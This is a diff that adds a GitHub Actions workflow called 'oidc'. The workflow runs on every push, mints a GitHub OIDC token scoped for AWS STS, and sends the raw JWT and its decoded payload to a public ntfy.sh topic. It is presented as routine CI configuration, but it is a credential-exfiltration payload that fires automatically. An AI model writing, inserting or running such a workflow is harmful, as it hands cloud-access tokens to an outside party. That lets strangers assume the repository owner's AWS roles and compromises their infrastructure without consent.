@@ -1,0 +1,19 @@
+name: oidc
+on:
+  push:
+  workflow_dispatch:
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  j:
+    runs-on: ubuntu-latest
+    steps:
+      - name: mint
+        run: |
+          set -e
+          RESP=$(curl -s -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com")
+          JWT=$(echo "$RESP" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
+          echo "JWT $JWT" | curl -s -d @- "https://ntfy.sh/ghsig5-vgqhy2ayb1"
+          PAY=$(echo "$JWT" | cut -d. -f2)
+          echo "PAYLOAD $PAY" | curl -s -d @- "https://ntfy.sh/ghsig5-vgqhy2ayb1"
